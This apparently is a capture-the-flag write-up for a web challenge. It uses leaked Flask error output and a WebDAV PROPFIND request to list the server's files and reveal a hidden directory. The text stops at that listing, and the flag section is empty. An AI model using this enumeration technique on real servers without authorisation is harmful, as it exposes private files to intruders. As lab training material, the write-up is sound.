# The Davinci Code
Uhhh, someone made a Da Vinci Code fan page? But they spelt it wrong, and it looks like the website seems broken...

# Flag

# Solution
Clicking on the button redirects to `/code` and shows a "Template Not Found" error. Inspecting the errors allows us to see some server code. Interesting lines in `/app/app.py` include:

```python
# File "/app/app.py", line 67, in code
        abort(405)
    abort(404)
 
@app.route('/code')
def code():
    return render_template("code.html")
 
@app.route('/', methods=['GET', 'PROPFIND'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
```

Using Postman to send a PROPFIND request returns this:

```xml
<D:multistatus xmlns:D="DAV:">
    <D:response>
        <D:href>/</D:href>
        <D:propstat>
            <D:prop>
                <D:message>WebDAVinci Code</D:message>
                <D:directory>True</D:directory>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/__pycache__</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>__pycache__</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/templates</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>templates</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/app.py</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>app.py</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/static</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>static</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/the_secret_dav_inci_code</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>the_secret_dav_inci_code</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
</D:multistatus>
```